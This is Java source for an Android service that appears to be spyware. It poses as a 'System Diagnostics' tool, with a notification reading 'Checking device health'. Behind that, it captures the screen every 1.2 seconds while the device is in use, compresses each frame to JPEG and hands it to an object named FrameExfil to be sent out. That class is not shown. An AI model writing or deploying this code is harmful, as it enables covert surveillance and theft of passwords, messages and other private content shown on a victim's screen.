package com.android.sysdiag;

import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.util.concurrent.atomic.AtomicBoolean;

public class ScreenCaptureService extends Service {

    private static final String CHANNEL_ID = "sys_diag";
    private static final int NOTIF_ID = 0xDEAD;
    private static final String EXTRA_RC = "rc";
    private static final String EXTRA_RD = "rd";
    private static final long FRAME_INTERVAL_MS = 1200L;

    public static volatile boolean isRunning = false;

    private MediaProjection projection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private HandlerThread workerThread;
    private Handler worker;
    private final AtomicBoolean busy = new AtomicBoolean(false);
    private FrameExfil exfil = new FrameExfil();

    private int screenW = 720, screenH = 1280, screenDpi = 320;

    public static void start(Context ctx, int rc, Intent data) {
        Intent i = new Intent(ctx, ScreenCaptureService.class);
        i.putExtra(EXTRA_RC, rc);
        i.putExtra(EXTRA_RD, data);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ctx.startForegroundService(i);
        } else {
            ctx.startService(i);
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_NOT_STICKY;

        startForegroundMasked();

        if (isRunning) return START_STICKY;

        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        DisplayMetrics metrics = new DisplayMetrics();
        if (wm != null) {
            wm.getDefaultDisplay().getRealMetrics(metrics);
        }
        screenW = metrics.widthPixels;
        screenH = metrics.heightPixels;
        screenDpi = metrics.densityDpi;

        int rc = intent.getIntExtra(EXTRA_RC, Activity.RESULT_CANCELED);
        Intent data = intent.getParcelableExtra(EXTRA_RD);
        if (rc != Activity.RESULT_OK || data == null) {
            stopSelf();
            return START_NOT_STICKY;
        }

        MediaProjectionManager mpm =
            (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        if (mpm == null) { stopSelf(); return START_NOT_STICKY; }

        try {
            projection = mpm.getMediaProjection(rc, data);
            if (projection == null) { stopSelf(); return START_NOT_STICKY; }

            projection.registerCallback(new MediaProjection.Callback() {
                @Override public void onStop() {
                    // Просто тихо останавливаемся, БЕЗ перезапуска
                    cleanup();
                    stopSelf();
                }
            }, new Handler(Looper.getMainLooper()));

            imageReader = ImageReader.newInstance(
                screenW, screenH, PixelFormat.RGBA_8888, 2
            );

            virtualDisplay = projection.createVirtualDisplay(
                "SysVD", screenW, screenH, screenDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(), null, null
            );
        } catch (Throwable t) {
            cleanup();
            stopSelf();
            return START_NOT_STICKY;
        }

        workerThread = new HandlerThread("SysWorker");
        workerThread.start();
        worker = new Handler(workerThread.getLooper());

        isRunning = true;
        worker.post(captureLoop);

        return START_NOT_STICKY;
    }

    private final Runnable captureLoop = new Runnable() {
        @Override
        public void run() {
            if (!isRunning) return;
            try {
                if (isScreenOn()) grabFrame();
            } catch (Throwable ignored) {}
            if (worker != null) worker.postDelayed(this, FRAME_INTERVAL_MS);
        }
    };

    private boolean isScreenOn() {
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        return pm != null && pm.isInteractive();
    }

    private void grabFrame() {
        if (!busy.compareAndSet(false, true)) return;
        try {
            ImageReader reader = imageReader;
            if (reader == null) return;
            Image image = reader.acquireLatestImage();
            if (image == null) return;
            try {
                byte[] jpeg = imageToJpeg(image);
                if (jpeg != null) {
                    final byte[] fj = jpeg;
                    new Thread(() -> exfil.send(fj)).start();
                }
            } finally {
                image.close();
            }
        } catch (Throwable ignored) {
        } finally {
            busy.set(false);
        }
    }

    private byte[] imageToJpeg(Image image) {
        Image.Plane plane = image.getPlanes()[0];
        ByteBuffer buffer = plane.getBuffer();
        int pixelStride = plane.getPixelStride();
        int rowStride = plane.getRowStride();
        int rowPadding = rowStride - pixelStride * screenW;

        Bitmap bmp = Bitmap.createBitmap(
            screenW + rowPadding / pixelStride,
            screenH,
            Bitmap.Config.ARGB_8888
        );
        bmp.copyPixelsFromBuffer(buffer);

        Bitmap cropped = Bitmap.createBitmap(bmp, 0, 0, screenW, screenH);
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        cropped.compress(Bitmap.CompressFormat.JPEG, 55, out);
        bmp.recycle();
        cropped.recycle();
        return out.toByteArray();
    }

    private void startForegroundMasked() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationManager nm =
                (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (nm != null && nm.getNotificationChannel(CHANNEL_ID) == null) {
                NotificationChannel ch = new NotificationChannel(
                    CHANNEL_ID, "Diagnostics", NotificationManager.IMPORTANCE_LOW
                );
                ch.setShowBadge(false);
                ch.enableVibration(false);
                ch.setSound(null, null);
                nm.createNotificationChannel(ch);
            }
        }
        Notification n = new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Diagnostics")
            .setContentText("Checking device health…")
            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIF_ID, n,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
        } else {
            startForeground(NOTIF_ID, n);
        }
    }

    private void cleanup() {
        isRunning = false;
        if (worker != null) worker.removeCallbacksAndMessages(null);
        if (virtualDisplay != null) { virtualDisplay.release(); virtualDisplay = null; }
        if (imageReader != null) { imageReader.close(); imageReader = null; }
        if (projection != null) { projection.stop(); projection = null; }
    }

    @Override
    public void onDestroy() {
        cleanup();
        if (workerThread != null) workerThread.quitSafely();
        super.onDestroy();
    }
                }
